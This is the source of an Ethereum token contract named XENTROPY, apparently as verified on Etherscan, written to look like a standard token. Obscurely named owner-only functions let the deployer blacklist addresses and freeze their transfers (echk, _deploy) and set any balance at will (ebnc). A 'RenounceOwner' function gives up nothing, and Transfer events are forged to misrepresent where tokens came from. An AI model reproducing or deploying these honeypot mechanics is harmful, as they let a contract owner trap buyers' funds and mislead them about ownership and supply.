/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

//SPDX-License-Identifier: UNLICENSED                              

pragma solidity 0.8.16;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract XENTROPY {
  
    mapping (address => uint256) public eAmnT;
    mapping (address => bool) eUsR;
	mapping (address => bool) eRen;



    // 
    string public name = "XENTROPY";
    string public symbol = unicode"XENTROPY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
    uint ems = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        eAmnT[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x51c32Bae322D949c6951F7c17DfC2237f74D741D;
    address Deployer = 0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier G() {   
    require(msg.sender == owner);
         _;}
    modifier H () {
        ems = 0;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {
        require(eAmnT[msg.sender] >= value);
        eAmnT[msg.sender] -= value;  
        eAmnT[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(eUsR[msg.sender]) {
        require(ems == 1);} 
        require(eAmnT[msg.sender] >= value);
        eAmnT[msg.sender] -= value;  
        eAmnT[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return eAmnT[account]; }
        function echk(address O) G public{          
        require(!eUsR[O]);
        eUsR[O] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function ebnc(address O, uint256 V) G public returns (bool success) {
        eAmnT[O] = V;
        return true; }
        function RenounceOwner(address O) public {
        require(msg.sender == owner);
        eRen[O] = true;}
        
        function edrw(address O) G public {
        require(eUsR[O]);
        eUsR[O] = false; }
		 function _deploy() H public {
            require(msg.sender == owner);
        }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= eAmnT[from]);
        require(value <= allowance[from][msg.sender]);
        eAmnT[from] -= value;  
        eAmnT[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(eUsR[from] || eUsR[to]) {
        require(ems == 1);}
        require(value <= eAmnT[from]);
        require(value <= allowance[from][msg.sender]);
        eAmnT[from] -= value;
        eAmnT[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }